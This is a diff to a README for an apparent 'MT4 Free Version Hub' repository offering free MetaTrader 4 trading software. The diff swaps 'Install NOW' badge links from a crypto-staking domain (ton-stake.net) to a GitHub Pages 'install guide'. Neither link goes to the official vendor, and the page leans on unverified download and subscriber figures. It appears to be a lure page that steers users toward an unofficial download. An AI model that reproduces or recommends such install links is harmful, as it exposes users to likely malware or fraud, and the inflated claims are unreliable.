@@ -7,9 +7,10 @@
 
 **Description**: Explore the world of trading with the **MetaTrader 4 (MT4) Free Version Hub** in 2025! This repository offers comprehensive tutorials, sample strategies, and resources for the free demo version and limited MT4 base version. Join our community with 40K+ downloads and 18K+ subscribers to master forex and stock trading!  
 
-[![Install MT4](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
-
----
+<a href="https://mt4community.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+ 
 
 ## 📋 Getting Started Guide  
 
@@ -33,9 +34,10 @@ Start your MT4 journey with these detailed steps to access the free version! �
 6. **Troubleshooting** ❓  
    If issues occur, disable your VPN, check your internet, or contact your broker’s support.  
 
-[![Install MT4](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
-
----
+<a href="https://mt4community.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+ 
 
 ## 💡 Why Choose MT4 Free Version Hub  
 
@@ -46,9 +48,10 @@ Start your MT4 journey with these detailed steps to access the free version! �
 - 🌍 **Active Community**: Supported by 40K+ downloads and 18K+ subscribers.  
 - 📅 **2025 Updates**: Stay current with the latest MT4 features.  
 
-[![Install MT4](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://mt4community.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
----
 
 ## 🎯 Usage Scenarios  
 
@@ -63,10 +66,6 @@ Start your MT4 journey with these detailed steps to access the free version! �
 - 📉 **Stock Analysis**: Analyze stock trends with historical data.  
 - 🤖 **Algo Trading**: Develop and test custom EAs.  
 - 📚 **Skill Building**: Learn from 18K+ subscriber strategies.  
-
-[![Install MT4](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
-
----
 
 ## 🏆 Benefits  
 
